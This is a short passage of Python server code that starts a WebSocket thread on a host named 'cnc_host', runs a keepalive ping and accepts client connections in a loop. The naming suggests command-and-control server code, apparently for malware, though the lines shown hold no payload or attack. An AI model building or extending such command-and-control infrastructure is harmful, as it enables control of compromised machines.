    threading.Thread(target=ws_thread, args=(cnc_host, ws_port)).start()
    print(f"WebSocket Server started on {cnc_host}:{ws_port}")

    threading.Thread(target=ping).start() # Start keepalive thread
    
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

def start():
    try:
        main()
    except Exception as e:
        print(f"Error, skipping.  {e}")
